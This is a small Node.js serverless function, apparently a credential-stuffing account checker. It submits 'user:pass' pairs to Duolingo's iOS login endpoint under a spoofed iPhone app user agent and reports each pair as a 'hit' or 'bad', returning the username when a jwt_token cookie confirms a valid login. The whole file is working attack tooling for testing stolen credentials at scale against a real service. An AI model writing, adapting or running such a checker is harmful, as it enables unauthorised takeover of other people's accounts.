const axios = require("axios");
const crypto = require("crypto");

module.exports = async (req, res) => {
  try {
    const account = req.query.account;
    if (!account || !account.includes(":")) {
      return res.status(400).json({ error: "Format: user:pass" });
    }

    const [username, password] = account.split(":");
    const distinctId = crypto.randomBytes(16).toString("hex");

    const response = await axios.post(
      "https://ios-api-2.duolingo.com/2023-05-23/login",
      {
        password,
        distinctId,
        identifier: username,
        fields:
          "username,productId,level,phoneNumber,totalXp,gems,num_followers,renewing,tier,currentCourse",
      },
      {
        timeout: 8000,
        headers: {
          "Content-Type": "application/json",
          "User-Agent":
            "DuolingoMobile/7.41.0 (iPhone; iOS 18.0; Scale/2.00)",
        },
        validateStatus: () => true,
      }
    );

    const source = JSON.stringify(response.data);
    const cookies = response.headers["set-cookie"] || [];
    const cookieStr = cookies.join("; ");

    if (source.trim() === "{}") {
      return res.json({ result: "bad", captured: {} });
    }

    if (source.includes('"currentCourse":') && cookieStr.includes("jwt_token")) {
      return res.json({
        result: "hit",
        captured: { İsim: response.data.username || null },
      });
    }

    return res.json({ result: "bad", captured: {} });
  } catch (err) {
    console.error("FUNCTION ERROR:", err);
    return res.status(500).json({ error: err.message });
  }
};
